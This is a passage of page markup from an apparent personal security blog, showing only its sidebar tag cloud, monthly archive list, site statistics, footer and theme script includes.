href="/tags/AFL/" style="font-size: 1.1em; color: #999">AFL</a> <a href="/tags/pentest/" style="font-size: 1.19em; color: #999da1">pentest</a> <a href="/tags/AI/" style="font-size: 1.1em; color: #999">AI</a> <a href="/tags/writeup/" style="font-size: 1.19em; color: #999da1">writeup</a> <a href="/tags/notes/" style="font-size: 1.23em; color: #999ea6">notes</a> <a href="/tags/note/" style="font-size: 1.28em; color: #99a0aa">note</a> <a href="/tags/muud/" style="font-size: 1.14em; color: #999b9d">muud</a> <a href="/tags/malware/" style="font-size: 1.32em; color: #99a2ae">malware</a> <a href="/tags/crack/" style="font-size: 1.14em; color: #999b9d">crack</a> <a href="/tags/Windows/" style="font-size: 1.1em; color: #999">Windows</a> <a href="/tags/BUUCTF/" style="font-size: 1.1em; color: #999">BUUCTF</a> <a href="/tags/spring/" style="font-size: 1.1em; color: #999">spring</a> <a href="/tags/bypass/" style="font-size: 1.37em; color: #99a4b2">bypass</a> <a href="/tags/kernel/" style="font-size: 1.46em; color: #99a7bb">kernel</a> <a href="/tags/misc/" style="font-size: 1.1em; color: #999">misc</a> <a href="/tags/Java/" style="font-size: 1.23em; color: #999ea6">Java</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>Archives</span>
+      <a class="card-more-btn" href="/archives/"
+            title="View More">
+            <i class="fas fa-angle-right"></i>
+          </a>
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2098/12/">
+            <span class="card-archive-list-date">
+              December 2098
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              April 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              March 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              February 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              January 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              November 2025
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/10/">
+            <span class="card-archive-list-date">
+              October 2025
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/08/">
+            <span class="card-archive-list-date">
+              August 2025
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Website Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article Count :</div><div class="item-count">79</div></div><div class="webinfo-item"><div class="item-name">Unique Visitors :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Page Views :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Last Update :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-04-23T12:01:03.231Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Joe1sn</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
